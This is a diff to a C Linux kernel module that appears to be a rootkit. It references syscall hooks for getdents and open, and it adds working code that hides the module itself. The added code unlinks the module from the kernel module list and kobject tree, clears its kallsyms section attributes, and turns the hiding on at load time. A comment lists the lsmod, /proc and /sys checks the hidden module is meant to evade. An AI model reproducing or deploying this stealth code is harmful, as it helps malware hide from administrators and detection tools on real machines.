@@ -36,7 +36,8 @@ extern int is_open;
 extern struct miscdevice kcr;
 extern asmlinkage int my_getdents(unsigned int, struct linux_dirent64*, unsigned int);
 
-static struct list_head *saved_modulle_head;
+static struct list_head *saved_mod_list_head;
+struct kobject *saved_kobj_parent;
 
 /*By Chen
  *
@@ -112,24 +113,50 @@ my_open(const char* file, int flags, int mode) {
 /* Koo: 
  *
  * Hiding/Unhiding the module itself
+ *		<linux/export.h>
+ *			struct module __this_module
+ *			#define THIS_MODULE (&__this_module)
+ *		<linux/kobject.h>
+ *			void kobject_del(struct kobject *kobj);
+ *			int kobject_add(struct kobject *kobj, struct kobject *parent, const char fmt, ...);
  *		<linux/list.h>
- * 			list_del_init(struct list_head *entry)
- *			list_add(struct list_head *new, struct list_head *head)
+ *			void list_del(struct list_head *entry)
+ *			void list_add(struct list_head *new, struct list_head *head)
+ * Testing to find the module in kernel
+ *	a. lsmod | grep kcr
+ *	b. modprobe
+ *	c. cat /proc/modules | grep kcr
+ *	d. cat /proc/kallsyms | grep "\[kcr\]"
+ *	e. ls -la /sys/module | grep kcr
  * */
-void hiding_module(void) {
-	saved_modulle_head = THIS_MODULE->list.prev;
-
+void
+hiding_module(void) {
+	// Save the addr of this module to restore if necessary
+	saved_mod_list_head = THIS_MODULE->list.prev;
+	saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
+	
 	// Remove this module from the module list and kobject list
-	list_del_init(&THIS_MODULE->list);
+	list_del(&THIS_MODULE->list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
+	
+	// Remove the symbol and string tables for kallsyms
+	// IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
+	// "sysfs group ffff8800260e4000 not found for kobject 'rt'"
+	THIS_MODULE->sect_attrs = NULL;
+	THIS_MODULE->notes_attrs = NULL;
 	
 	if (DEBUG == 1) 
 		printk(KERN_ALERT "Module successully hidden!\n");
 }
 
-void unhiding_module(void) {
-	// Add this module to the module list
-	list_add(&THIS_MODULE->list, saved_modulle_head);
+void
+unhiding_module(void) {
+	int r;
+	
+	// Restore this module to the module list and kobject list
+	list_add(&THIS_MODULE->list, saved_mod_list_head);
+	if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "rt")) < 0)
+		printk(KERN_ALERT "Error to restore kobject to the list back!!\n");
 	
 	if (DEBUG == 1) 
 		printk(KERN_ALERT "Module successully revealed!\n");
@@ -175,8 +202,8 @@ __init init_mod(void) {
 	//Changing the control bit back
 	PROT_ENABLE;
 	
-	//hiding_module();
-	//unhiding_module();
+	hiding_module();
+	unhiding_module();
 	
 	return 0;
 }
